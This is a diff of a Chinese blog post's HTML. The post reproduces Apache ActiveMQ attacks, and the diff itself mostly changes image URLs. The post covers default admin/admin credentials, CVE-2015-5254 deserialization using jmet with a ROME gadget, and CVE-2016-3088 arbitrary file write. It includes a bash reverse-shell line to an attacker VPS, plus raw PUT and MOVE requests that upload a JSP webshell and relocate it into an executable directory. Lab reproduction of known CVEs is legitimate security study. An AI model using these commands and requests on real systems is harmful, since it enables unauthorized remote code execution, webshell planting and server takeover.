@@ -15,18 +15,18 @@
 <meta property="og:site_name" content="腾小飞的博客">
 <meta property="og:description" content="摘要Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。 本次复现默认口令、反序列漏洞（CVE-2015-5254 ）、PUT任意文件写入（CVE-2016-3088），其他漏洞感觉有点鸡肋就不复现了">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://qaote8jit.bkt.clouddn.com/githubimage-20200609113424901.png">
-<meta property="og:image" content="http://qaote8jit.bkt.clouddn.com/githubimage-20200609114603532.png">
-<meta property="og:image" content="http://qaote8jit.bkt.clouddn.com/githubimage-20200609144843836.png">
-<meta property="og:image" content="http://qaote8jit.bkt.clouddn.com/githubimage-20200609145216094.png">
-<meta property="og:image" content="http://qaote8jit.bkt.clouddn.com/githubimage-20200609173254630.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609113424901.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609114603532.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609144843836.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609145216094.png">
+<meta property="og:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609173254630.png">
 <meta property="article:published_time" content="2020-06-09T02:43:16.000Z">
-<meta property="article:modified_time" content="2020-06-09T09:58:11.221Z">
+<meta property="article:modified_time" content="2020-06-23T02:39:21.391Z">
 <meta property="article:author" content="腾小飞的博客">
 <meta property="article:tag" content="exp">
 <meta property="article:tag" content="ActiveMQ">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://qaote8jit.bkt.clouddn.com/githubimage-20200609113424901.png">
+<meta name="twitter:image" content="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609113424901.png">
   
     <link rel="alternative" href="/atom.xml" title="腾小飞的博客" type="application/atom+xml">
   
@@ -191,10 +191,10 @@
 <h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><p>使用NMAP对目标进行扫描，队列默认端口是61616，web默认端口是8161，这里注意，NMAP扫描默认是没有这两个端口的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV IP -p 8161,61616</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qaote8jit.bkt.clouddn.com/githubimage-20200609113424901.png" alt="image-20200609113424901"></p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609113424901.png" alt="githubimage-20200609113424901"></p>
 <h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache ActiveMQ 5.13.0之前5.x版本中</p>
 <h3 id="默认口令漏洞"><a href="#默认口令漏洞" class="headerlink" title="默认口令漏洞"></a>默认口令漏洞</h3><p>ActiveMQ默认口令是admin/admin，登录后可看到版本信息。<strong>反序列需要登录后触发，任意文件上传访问webshell需要登录</strong></p>
-<p><img src="http://qaote8jit.bkt.clouddn.com/githubimage-20200609114603532.png" alt="image-20200609114603532"></p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609114603532.png" alt="githubimage-20200609114603532"></p>
 <h3 id="反序列漏洞（CVE-2015-5254-）"><a href="#反序列漏洞（CVE-2015-5254-）" class="headerlink" title="反序列漏洞（CVE-2015-5254 ）"></a>反序列漏洞（CVE-2015-5254 ）</h3><p>漏洞利用过程如下：</p>
 <p>a.构造（可以使用ysoserial）可执行命令的序列化对象</p>
 <p>b.作为一个消息，发送给目标61616端口</p>
@@ -203,7 +203,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;sucess&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>
 
 <p>发送成功后会有如下提示</p>
-<p><img src="http://qaote8jit.bkt.clouddn.com/githubimage-20200609144843836.png" alt="image-20200609144843836"></p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609144843836.png" alt="githubimage-20200609144843836"></p>
 <p>点击队列即可触发（如果没有弱口令，可写入后等待管理员点击触发），可成功执行建立文件的命令，这里可通过以下命令进入docker查看</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it  cc0e9385f975  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
 
@@ -212,7 +212,7 @@
 <p>反弹shell需要在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">这里</a>将bash反弹命令进行编码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qaote8jit.bkt.clouddn.com/githubimage-20200609145216094.png" alt="image-20200609145216094"></p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609145216094.png" alt="githubimage-20200609145216094"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;编码后的反弹命令&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>
 
 <p>在vps上监听对应端口，触发条件和前面一样需要登录后点击队列中的消息</p>
@@ -226,7 +226,7 @@
 <h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;shell.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.197.25:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">this is jsp webshell code.</span><br></pre></td></tr></table></figure>
 
 <p>PUT最好写个小马，因为直接PUT大马会存在编码等问题，PUT进去后并不能直接解析，访问如下</p>
-<p><img src="http://qaote8jit.bkt.clouddn.com/githubimage-20200609173254630.png" alt="image-20200609173254630"></p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/githubimage-20200609173254630.png" alt="githubimage-20200609173254630"></p>
 <p>需要把木马挪到可以解析的目录，如admin目录api目录，payload如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;uu.jsp HTTP&#x2F;1.1</span><br><span class="line">Destination:file:&#x2F;opt&#x2F;apache-activemq-5.11.1&#x2F;webapps&#x2F;api&#x2F;uu.jsp</span><br><span class="line">Host: 192.168.197.25:8161</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4&#x3D;</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
 
